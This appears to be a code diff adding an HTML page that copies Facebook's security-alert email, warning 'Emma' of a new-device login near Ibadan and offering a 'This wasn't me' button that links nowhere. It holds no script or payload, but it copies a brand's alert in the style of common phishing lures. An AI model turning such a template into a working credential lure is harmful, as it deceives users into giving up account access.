@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security Alert</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #1d2129;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f6f7;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            color: #1d2129;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .greeting {
+            margin-bottom: 20px;
+        }
+        
+        .alert-text {
+            margin-bottom: 25px;
+        }
+        
+        .details {
+            background-color: #f5f6f7;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+        
+        .detail-item {
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .detail-icon {
+            color: #65676b;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .location, .device, .time {
+            font-weight: bold;
+        }
+        
+        .divider {
+            border-top: 1px solid #dddfe2;
+            margin: 25px 0;
+        }
+        
+        .action-button {
+            display: inline-block;
+            background-color: #1877f2;
+            color: white;
+            text-decoration: none;
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .footer {
+            font-size: 14px;
+            color: #65676b;
+            margin-top: 30px;
+        }
+        
+        .help-link {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        
+        .signature {
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">Security alert: login near Ibadan on a new device</div>
+        
+        <div class="greeting">Hi Emma,</div>
+        
+        <div class="alert-text">
+            Someone just logged into your Facebook account near Ibadan, Nigeria on Facebook for iPhone. If this wasn't you, we're here to help you take some simple steps to secure your account.
+        </div>
+        
+        <div class="details">
+            <div class="detail-item">
+                <div class="detail-icon"><i class="fas fa-map-marker-alt"></i></div>
+                <div><span class="location">Ibadan</span>, Nigeria</div>
+            </div>
+            <div class="detail-item">
+                <div class="detail-icon"><i class="fas fa-mobile-alt"></i></div>
+                <div><span class="device">Facebook for iPhone</span></div>
+            </div>
+            <div class="detail-item">
+                <div class="detail-icon"><i class="far fa-clock"></i></div>
+                <div><span class="time">Thursday, May 29, 2025 at 7:49PM</span></div>
+            </div>
+        </div>
+        
+        <strong>Was this you?</strong>
+        
+        <div class="divider"></div>
+        
+        <a href="#" class="action-button">This wasn't me</a>
+        
+        <div>
+            If this was you, you can ignore this email.
+        </div>
+        
+        <div class="footer">
+            Wondering if this email is really from us? Visit the <a href="https://www.facebook.com/help/check-email" class="help-link">Help Center</a> to confirm.
+            <br><br>
+            To improve your account security, we've enabled login alerts. We'll continue to notify you whenever your username and password are used to login from a new browser or device.
+        </div>
+        
+        <div class="signature">
+            Thanks,<br>
+            Facebook Security
+        </div>
+    </div>
+</body>
+</html>
